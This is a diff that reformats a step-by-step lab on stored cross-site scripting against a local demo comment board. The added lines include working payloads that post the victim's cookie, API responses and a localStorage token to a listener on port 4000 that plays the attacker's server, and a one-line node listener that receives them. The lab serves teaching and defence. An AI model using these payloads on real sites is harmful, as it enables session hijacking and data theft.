@@ -185,78 +185,92 @@ This step proves the payload is stored server-side, not just reflected in your c
 - Post the payload: `<img src=x onerror="alert('XSS')">`
 - Close the browser tab completely.
 - Reopen http://localhost:3000.
--The alert fires again, before you interact with anything.
+- The alert fires again, before you interact with anything.
 
-Why it works: on every page load, the client calls GET /api/comments, receives the stored raw HTML, and passes it to innerHTML. The browser parses the string fresh each time — so the payload re-executes on every visit.
+**Why it works:** on every page load, the client calls `GET /api/comments`, receives the stored raw HTML, and passes it to `innerHTML`. The browser parses the string fresh each time — so the payload re-executes on every visit.
 
-Teaching point: With Reflected XSS, a victim must click a crafted link. With Stored XSS, no link is needed — anyone who visits the page is a victim.
+**Teaching point:** With Reflected XSS, a victim must click a crafted link. With Stored XSS, no link is needed — anyone who visits the page is a victim.
 
 ---
 
-Step 3 — Cookie Theft
+### Step 3 — Cookie Theft
 This step shows how an attacker exfiltrates session data.
 
-3a. Set a "session" cookie for the demo
-Open DevTools → Console on http://localhost:3000:
+#### 3a. Set a "session" cookie for the demo
+Open DevTools → Console on `http://localhost:3000`:
 
-javascript
+```
 document.cookie = "session=demo-secret-token-123; path=/";
+```
+
 Confirm it's set:
 
-javascript
+```
 console.log(document.cookie);
 // → session=demo-secret-token-123
-⚠️ Real-world note: Production session cookies should be marked HttpOnly,
-which prevents JavaScript from reading them. We're using a JS-readable cookie here
-so the demo works. Discussing HttpOnly as a defense is the point of this step.
+```
 
-3b. Start a local exfiltration listener
+> ⚠️ Real-world note: Production session cookies should be marked `HttpOnly`,
+> which prevents JavaScript from reading them. We're using a JS-readable cookie here
+> so the demo works. Discussing `HttpOnly` as a defense is the point of this step.
+
+#### 3b. Start a local exfiltration listener
 Open a second terminal and run a tiny HTTP listener on port 4000:
 
-bash
+```
 node -e "require('http').createServer((q,r)=>{console.log('STOLEN:',q.url);r.end('ok')}).listen(4000)"
+```
+
 Leave it running. It will log any incoming requests.
 
-3c. Post the exfiltration payload
+#### 3c. Post the exfiltration payload
 Submit this as a comment:
 
-html
+```
 <img src=x onerror="fetch('http://localhost:4000/steal?c='+encodeURIComponent(document.cookie))">
+```
+
 Then reload the page.
 
-3d. Watch the result
+#### 3d. Watch the result
 In your listener terminal, you should see:
 
-text
+```
 STOLEN: /steal?c=session%3Ddemo-secret-token-123
-The URL-decoded version is session=demo-secret-token-123 — the victim's session token, now in the attacker's hands.
+```
 
-Step 4 — Session Hijacking Scenario (Advanced)
+The URL-decoded version is `session=demo-secret-token-123` — the victim's session token, now in the attacker's hands.
+
+---
+
+### Step 4 — Session Hijacking Scenario (Advanced)
 To make the impact concrete, you can simulate a full session-hijack flow:
 
-The setup:
+**The setup:**
 
-App runs on http://localhost:3000 (the "victim" app).
+- App runs on `http://localhost:3000` (the "victim" app).
+- Attacker listener runs on `http://localhost:4000` (the "attacker" server).
 
-Attacker listener runs on http://localhost:4000 (the "attacker" server).
+**The flow:**
 
-The flow:
+- A victim (e.g., a logged-in admin) visits the comment board.
+- The stored payload fires in their browser.
+- The payload runs a script that calls the victim app's API as that victim and sends the response to the attacker.
 
-A victim (e.g., a logged-in admin) visits the comment board.
+**Example payload** — exfiltrate the victim's view of all comments:
 
-The stored payload fires in their browser.
-
-The payload runs a script that calls the victim app's API as that victim and sends the response to the attacker.
-
-Example payload — exfiltrate the victim's view of all comments:
-
-html
+```
 <img src=x onerror="fetch('/api/comments').then(r=>r.text()).then(t=>fetch('http://localhost:4000/exfil?d='+encodeURIComponent(t)))">
-Example payload — exfiltrate localStorage (if the app stored a token there):
+```
 
-html
+**Example payload** — exfiltrate localStorage (if the app stored a token there):
+
+```
 <img src=x onerror="fetch('http://localhost:4000/exfil?d='+encodeURIComponent(localStorage.getItem('token')||'none'))">
-Teaching point: Because the script runs on the app's origin, it inherits the victim's authenticated session. Anything the victim could do on the page, the attacker's script can do — including reading private data and making state-changing requests (CSRF-style actions with stolen credentials).
+```
+**Teaching point:** Because the script runs on the app's origin, it inherits the victim's authenticated session. Anything the victim could do on the page, the attacker's script can do — including reading private data and making state-changing requests (CSRF-style actions with stolen credentials).
+
+---
 
 🔁 Why Reload Triggers the Payload
 A common misconception is that the browser "re-executes" the stored script. In reality, on every page load the script is re-injected into a fresh document:
